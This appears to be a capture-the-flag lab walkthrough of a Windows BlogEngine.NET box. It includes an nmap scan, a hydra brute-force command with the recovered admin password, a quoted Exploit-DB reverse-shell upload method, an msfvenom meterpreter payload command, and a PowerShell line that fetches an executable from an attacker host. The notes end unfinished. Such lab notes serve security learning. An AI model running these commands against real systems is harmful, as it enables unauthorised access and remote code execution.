@@ -1,0 +1,93 @@
+
+
+hydra // BlogEngine.net edit post with reverse shell //  escalate with msf  // 
+
+Nmap 7.91 scan initiated Thu Feb 11 11:45:00 2021 as: nmap -Pn -sV -sC -oN hackpark0 10.10.113.48
+Nmap scan report for 10.10.113.48
+Host is up (0.11s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2020-10-01T21:12:23
+|_Not valid after:  2021-04-02T21:12:23
+|_ssl-date: 2021-02-11T16:45:28+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+we see a login section and get to hydra for some initial access ,,   
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.203.102 http-post-form "/Account/login.aspx?ReturnURL=%2admin%2f:__VIEWSTATE=dZVppvO7thw8c%2Bc%2BvjQaeX3DET7QqB9bDVY82tOh6nnhUNllRCN4dP0IcWLAN9daG%2FZmIAepzGo%2BE8kYuht0BGhXjJGEqg2ULFnH7g7LQnRp8IDZmo94qkXgmEddtNcYPahTiFBS19X5K%2BJv%2BJskU2QqyPhUXlZTihj%2BZlydypGmc%2BZC0X56b9EdbNnOcek4b%2FKwEwLAxVaOB%2BVcUq7b1DyihFBj%2BKOwJRjc1poDmqgBIL13J7ECP3EYP7EbCnI5SBBg0eYtrLnAuPokasP5adpbtc3JChw%2FnjQEx7dq%2BVdOHyai2OGOa04n05AhHqlEC0nKkRLKF2CyZZQndS7jxDpu2dQ1Pw04yRFIgOsEji0JiY33&__EVENTVALIDATION=8WriVMR9u8w1rbYvWY7RulFn%2BtpEem0%2Fhl%2FbACmKbsO1CJEKrn402ng%2BbBUCD1WVk%2FL%2BMnARIPbEOwY78CjcgiIz33w2nPYWg3HleYenifMfGyvZdl2ihoqnlW30Ox1H9dKA2x8wKArLEPEGzbkUAo6bzKqq6rqahwc1TL9t81yooEkv&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-23 15:57:03
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.203.102:80/Account/login.aspx?ReturnURL=%2admin%2f:__VIEWSTATE=dZVppvO7thw8c%2Bc%2BvjQaeX3DET7QqB9bDVY82tOh6nnhUNllRCN4dP0IcWLAN9daG%2FZmIAepzGo%2BE8kYuht0BGhXjJGEqg2ULFnH7g7LQnRp8IDZmo94qkXgmEddtNcYPahTiFBS19X5K%2BJv%2BJskU2QqyPhUXlZTihj%2BZlydypGmc%2BZC0X56b9EdbNnOcek4b%2FKwEwLAxVaOB%2BVcUq7b1DyihFBj%2BKOwJRjc1poDmqgBIL13J7ECP3EYP7EbCnI5SBBg0eYtrLnAuPokasP5adpbtc3JChw%2FnjQEx7dq%2BVdOHyai2OGOa04n05AhHqlEC0nKkRLKF2CyZZQndS7jxDpu2dQ1Pw04yRFIgOsEji0JiY33&__EVENTVALIDATION=8WriVMR9u8w1rbYvWY7RulFn%2BtpEem0%2Fhl%2FbACmKbsO1CJEKrn402ng%2BbBUCD1WVk%2FL%2BMnARIPbEOwY78CjcgiIz33w2nPYWg3HleYenifMfGyvZdl2ihoqnlW30Ox1H9dKA2x8wKArLEPEGzbkUAo6bzKqq6rqahwc1TL9t81yooEkv&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 1165.00 tries/min, 1165 tries in 00:01h, 14343233 to do in 205:12h, 16 active
+[VERBOSE] Page redirected to http://10.10.203.102/
+[80][http-post-form] host: 10.10.203.102   login: admin   password: 1qaz2wsx
+[STATUS] attack finished for 10.10.203.102 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-23 15:58:24
+
+got lucky ,  
+admin:1qaz2wsx
+
+we log in and we get a version number 
+
+
+Your BlogEngine.NET Specification
+
+    Version: 3.3.6.0 
+
+
+
+https://www.exploit-db.com/exploits/46353
+
+
+Attack:
+ *
+ * First, we set the TcpClient address and port within the method below to 
+ * our attack host, who has a reverse tcp listener waiting for a connection.
+ * Next, we upload this file through the file manager.  In the current (3.3.6)
+ * version of BlogEngine, this is done by editing a post and clicking on the 
+ * icon that looks like an open file in the toolbar.  Note that this file must
+ * be uploaded as PostView.ascx. Once uploaded, the file will be in the
+ * /App_Data/files directory off of the document root. The admin page that
+ * allows upload is:
+ *
+ * http://10.10.10.10/admin/app/editor/editpost.cshtml
+ *
+ *
+ * Finally, the vulnerability is triggered by accessing the base URL for the 
+ * blog with a theme override specified like so:
+ *
+ * http://10.10.10.10/?theme=../../App_Data/files
+ *
+
+it freaking works,, 
+
+escalating
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.4.45 LPORT=9898 -f exe > shell.exe 
+
+start python server on 80
+  
+upload file to host
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.9.4.45:80/shells.exe' -OutFile 'C:\Windows\Temp\shells.exe'"
+
+went plural,, can't get it to work,, 
+
+
+
